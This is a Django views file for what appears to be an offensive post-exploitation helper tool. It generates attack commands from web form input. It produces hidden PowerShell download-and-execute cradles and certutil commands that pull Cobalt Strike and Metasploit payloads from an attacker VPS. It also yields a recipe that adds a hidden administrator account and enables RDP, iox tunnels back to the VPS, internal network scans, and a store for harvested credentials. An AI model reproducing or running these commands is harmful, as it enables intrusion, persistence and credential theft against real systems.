import base64
import codecs
import os
import re
import traceback
import configparser
import random
from math import floor

from django.http import HttpRequest, HttpResponse, FileResponse
from django.shortcuts import render
from PwdModel.models import Pwd

from . import json

cmd_type_list = ["写入文件", "下载文件", "远控木马", "iox", "内网信息探测"]
cmd_functions = ["write_cmd", "download_cmd", "payload_cmd", "iox_cmd", "system_cmd"]

conf = configparser.ConfigParser()
conf.read((os.path.dirname(os.path.abspath("settings.py"))) + "\config.ini")
vps_url = conf.get("setting", "VPS_URL")
vps_ip = conf.get("setting", "VPS_IP")
cs_exe = conf.get("setting", "CS_EXE_URL")
cs_powershell = conf.get("setting", "CS_POWERSHELL_URL")
msf_exe = conf.get("setting", "MSF_EXE_URL")
msf_powershell = conf.get("setting", "MSF_POWERSHELL_URL")
key_list = [';', ':', " ", "\t"]

iox_payload = """
[FWD模式]: 
    *端口转发至本地: ./iox fwd -l {lport} -l {rport}
    *端口转发至VPS: 
        (localhost)     ./iox fwd -l {lport} -r {vps_ip}:{vport}
        (vps)             ./iox fwd -l {vps_ip}:{vport} -r {vps_ip}:2333 
[PROXY模式]:
    *本地开启Sock5服务: ./iox proxy -l {rport}
    *Sock5服务转发至VPS:
        <original>
            (localhost)    ./iox proxy -r {vps_ip}:9999 
            (vps)            ./iox proxy -l 9999 -l {vport}
        <encrypt>
            (localhost)    ./iox fwd -l 1080 -r *{vps_ip}:9999 -k 000102
            (vps)            ./iox proxy -l *9999 -l {vport} -k 000102
    *本机配置Proxifier: 
        <sock5>           {vps_ip}:{vport}
""".strip()

window_payload = """
[本机信息]
    【基本信息】
        net users
    【开启RDP服务】
        net user jonny *Asd221117 /add
        net localgroup Administrators jonny /add
        REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
    【查找文件】
        for /r {dir} %i in (*{find_file}) do @echo %i
    【进程信息】
        [Linux] ps -ef: 获取所有进程命令行
        [Windows] tasklist
------------------------------------------------------------------------------------------
[内网信息]
    【扫描网段存活主机 - cmd】
        for /l %i in (1,1,255) do @ping {rip_l}.%i -w 1 -n 1|find /i "ttl="
    【扫描445端口 - cobaltstrike】
        portscan {rip}/24 445 arp 200
""".strip()

domain_payload = """

"""

class CMD():
    def __init__(self, request: HttpRequest):
        self.cmd_type = int(request.POST["ctype"])
        self.encrypt_type = int(request.POST["etype"])
        self.write_type = int(request.POST['wtype'])
        self.file = (request.POST['file']).replace("\\", "/")
        self.url = request.POST["url"]
        self.content = request.POST["content"]
        self.lport = request.POST["lport"] if request.POST["lport"] else "3389"
        self.rport = request.POST["rport"] if request.POST["rport"] else "12345"
        self.vport = request.POST["vport"] if request.POST["vport"] else "12345"
        self.cs_exe = request.POST["cs"] if request.POST["cs"] else cs_exe
        self.msf_exe = request.POST["msf"] if request.POST["msf"] else msf_exe
        self.cs_powshell = cs_powershell
        self.msf_powshell = msf_powershell
        self.range = request.POST["range"]
        self.rip = str(request.POST["rip"]) if request.POST["rip"] else "192.168.1.1"
        self.dir = str(request.POST["dir"]) if request.POST["dir"] else "D:"
        self.find_file = str(request.POST["find_file"]) if request.POST["find_file"] else "test.txt"
        self.length = 25

    def filter_char(self, text: str):   # 过滤Linux下的特殊字符
        return text.replace("$", "\$").replace(";", "\;")

    def write_cmd(self):
        def windows_cmd_0():  # 普通Windows写文件
            cmd_list = []
            all_content = self.content
            for i in range(0, floor(len(all_content) / self.length) + 1):
                content = all_content[self.length * i:self.length * (i + 1)]
                if content:
                    cmd1 = f"echo \"{content}\" >> {self.file}"
                    cmd_list.append(cmd1)
            cmd_list.append("(\"<\",\">\"前可加^转义)")
            return cmd_list

        def windows_cmd_1():  # base64加密Windows写文件
            cmd_list = []
            all_content = base64.b64encode(self.content.encode()).decode()
            for i in range(0, floor(len(all_content) / self.length) + 1):
                content = all_content[self.length * i:self.length * (i + 1)]
                tmp_file = "/".join(self.file.split("/")[:-1]) + ("/tmp.txt" if "/" in self.file else "tmp.txt")
                cmd1 = f"echo \"{content}\" >> {tmp_file}"
                cmd_list.append(cmd1)
            cmd2 = f"certutil -decode {tmp_file} {self.file}"
            cmd3 = f"del {tmp_file}"
            cmd_list.append(cmd2)
            cmd_list.append(cmd3)
            return cmd_list

        def linux_cmd_0():  # 普通Linux写文件
            self.content = self.filter_char(self.content)
            return windows_cmd_0()

        def linux_cmd_1():  # base64加密Linux写文件
            cmd_list = []
            all_content = self.filter_char(base64.b64encode(self.content.encode()).decode())
            for i in range(0, floor(len(all_content) / self.length) + 1):
                content = all_content[self.length * i:self.length * (i + 1)]
                cmd1 = f"echo \"{content}\" | base64 -d >> {self.file}"
                cmd_list.append(cmd1)
            return cmd_list

        def php_cmd_0():
            return f"<?php file_put_contents('{self.file}', '{self.content}'); ?>"

        if self.write_type != 0:
            self.length = 100000
        php_payload = php_cmd_0()
        if self.encrypt_type == 0:
            windows_payload = windows_cmd_1()
            linux_payload = linux_cmd_1()
        else:
            php_payload = php_cmd_0()
            windows_payload = windows_cmd_0()
            linux_payload = linux_cmd_0()
        cmd_dict = {"WINDOWS": windows_payload, "LINUX": linux_payload, "PHP": php_payload}
        return cmd_dict

    def download_cmd(self):
        def windows_cmd_0():
            return f"certutil.exe -urlcache -split -f \"{self.url}\" \"{self.file}\""

        def powershell_cmd_0():
            return f"""
            powershell "($client = new-object System.Net.WebClient) -and ($client.DownloadFile('{self.url}', '{self.file}')) -and (exit)"
            """.strip()

        def linux_cmd_0():
            return f"wget {self.url} -P {self.file}"

        def php_cmd_0():
            return f"<?php copy('{self.url}', '{self.file}'); ?>"

        if not "http://" in self.url:
            self.url = vps_url + self.url
        return {"WINDOWS": windows_cmd_0(), "POWERSHELL": powershell_cmd_0(), "LINUX": linux_cmd_0(),
                "PHP": php_cmd_0()}

    # 内网信息探测
    def system_cmd(self):
        if self.range == "0":
            return window_payload.format(rip=self.rip, rip_l=".".join(self.rip.split(".")[:-1]), dir=self.dir, find_file=self.find_file)
        else:
            return domain_payload

    def payload_cmd(self):
        def windows_cmd_0(url):
            filename = str(random.randint(1, 999)) + ".exe"
            return [f"certutil.exe -urlcache -split -f \"{url}\" {filename} ", filename]
        def windows_cmd_1(url):
            return f'''
            powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('{url}'))"
            '''.strip()
        return {
            "CobaltStrike-exe": windows_cmd_0(self.cs_exe),
            "CobaltStrike-powershell": windows_cmd_1(self.cs_powshell),
            "Metasploit-exe": windows_cmd_0(self.msf_exe),
            "Metasploit-powershell": windows_cmd_1(self.msf_powshell),
                }

    def iox_cmd(self):
        return iox_payload.format(vps_ip=vps_ip, lport=self.lport, rport=self.rport, vport=self.vport)

    def get_cmd(self):
        cmd_function = cmd_functions[int(self.cmd_type)]
        func = getattr(self, cmd_function)
        return func()


def get_cmd_ctx(request):
    ctx = {"cmd_type_list": cmd_type_list, "cmd_type": request.session["cmd_type"] if "cmd_type" in request.session else 0}
    return ctx


def cmd(request: HttpRequest):
    ctx = get_cmd_ctx(request)
    if not "cmd_type" in request.session:
        request.session["cmd_type"] = 0
    if request.method == "GET":
        return render(request, "cmd.html", ctx)
    else:
        cmd = CMD(request)
        result_text = []
        result = cmd.get_cmd()
        split_line = "\n" + "-" * 90 + "\n"
        if type(result) == dict:
            for k, v in result.items():
                if type(v) == list:
                    v = "\n    ".join(v)
                result_text.append(f"[{k}]:\n    {v}")
            result_text = split_line.join(result_text)
        else:
            result_text = result
        return HttpResponse(result_text)

def get_pwd_ctx():
    ctx = {"pwd_list": Pwd.objects.order_by("system").all()}
    return ctx



def pwd_list(request: HttpRequest):
    if request.method == "GET":
        return render(request, "pwd_list.html", get_pwd_ctx())

def add_pwd(requset: HttpRequest):
    pwd_text = requset.POST["pwd"]
    pwd_list = pwd_text.split("\n")
    print(pwd_list)
    for p in pwd_list:
        p = p.replace("，", ",")
        for k in key_list:
            p.replace(k, ",")
        p = p.split(",")
        try:
            pwd = Pwd(system=p[0], username=p[1], password=p[2])
            pwd.save()
        except:
            pass
    return HttpResponse("")

def delete_pwd(request: HttpRequest):
    pwd = Pwd.objects.get(id=request.GET["id"])
    pwd.delete()
    return HttpResponse("success")

def change_cmd_type(request: HttpRequest):
    request.session["cmd_type"] = request.GET["cmd_type"]
    print(request.session["cmd_type"])
    return HttpResponse("success")